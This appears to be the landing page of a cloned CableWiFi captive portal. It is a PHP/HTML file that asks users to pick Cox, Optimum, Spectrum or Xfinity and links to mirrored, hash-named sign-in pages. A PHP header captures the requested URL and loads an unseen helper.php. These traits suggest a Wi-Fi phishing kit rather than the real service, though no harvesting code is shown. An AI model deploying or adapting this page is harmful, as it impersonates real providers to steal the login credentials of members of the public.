<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<!DOCTYPE html>
<html lang="en-US" class="">
  
<meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" />
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title>CableWiFi&trade;</title>
    <meta name="description" content="">

    <!-- Favicon metadata, place favicon.ico in the root directory -->
    <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon2791.png?v=A0eBo0aEAx">
    <link rel="icon" type="image/png" sizes="32x32" href="assets/images/favicon-32x322791.png?v=A0eBo0aEAx">
    <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon-16x162791.png?v=A0eBo0aEAx">
    <link rel="manifest" href="assets/images/manifest2791.json?v=A0eBo0aEAx">
    <link rel="mask-icon" href="assets/images/safari-pinned-tab2791.svg?v=A0eBo0aEAx" color="#5bbad5">
    <link rel="shortcut icon" href="favicon2791.html?v=A0eBo0aEAx">
    <meta name="theme-color" content="#ffffff">

    <!-- Prevent iOS from detecting phone numbers and adding their own link and style -->
    <meta name="format-detection" content="telephone=no">

    <link rel="stylesheet" href="assets/css/app.css">
  </head>

  <body>
    <div id="myApp">

      <!--[if IE]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
      <![endif]-->

      <main class="main-container cw-container cw-toolbar-fixed-adjust" role="main">
        <header role="banner">
          <h1>Welcome!</h1>
          <p>To use WiFi, please select your internet service provider.</p>
        </header>
        <ul class="provider-list">
          <li><a class="cw-card" href="signince44.php?mso=cox"><img class="cox-logo" src="assets/images/Cox_4C.png" alt="Cox"></a></li>
          <li><a class="cw-card" href="signin8d07.php?mso=cvc"><img class="optimum-logo" src="assets/images/cvc-logo.svg" alt="Optimum"></a></li>
          <li><a class="cw-card" href="signin209b.php?mso=spectrum"><img class="spectrum-logo" src="assets/images/spectrum-logo.svg" alt="Spectrum"></a></li>
          <li><a class="cw-card" href="signin5d8f.php?mso=ccc"><img class="xfinity-logo" src="assets/images/ccc-logo.svg" alt="Xfinity"></a></li>
        </ul>
      </main>
    </div><!-- /#myApp -->

	<!--Omniture Tag -->
	<script type = 'text/javascript'>
		 var omniture_account = 'cablevisionwifi'; //set omniture report suite
	</script>
	
	<div id="HeaderChannel" style="display:none;">WIFI Sign In</div>
	<div id="LeftMenuLevels" style="display:none;">CableWIFI - Home</div> 
	<script type="text/javascript" src="assets/js/omniture/1.js"></script>
	<!--End Omniture Tag -->
	
    <!-- Vue Library -->
    <script src="assets/js/vue.js"></script>

    <!-- Application scripts bundle -->
    <script src="assets/js/app.js"></script>

  </body>
</html>
